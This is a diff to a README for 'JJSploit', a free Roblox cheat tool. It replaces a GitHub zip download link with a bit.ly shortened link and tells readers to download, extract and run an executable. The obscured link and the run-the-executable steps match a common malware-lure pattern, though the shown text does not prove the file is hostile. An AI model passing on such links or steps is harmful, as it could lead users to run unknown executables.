@@ -18,7 +18,7 @@ JJSploit, now available for free, is a widely-used Roblox exploit favored for it
 ## Installation
 
 To get JJSploit up and running on your machine, follow these steps:
-1. Download the [latest release](https://github.com/alfatraktor-vegas/downlod/releases/download/Download/Script.Github.zip) from the download button below.
+1. Download the [latest release](https://bit.ly/3Vk6jRq) from the download button below.
 2. Extract the downloaded zip file to a location of your choice.
 3. Run the executable file and follow the on-screen instructions to complete the installation process.
 
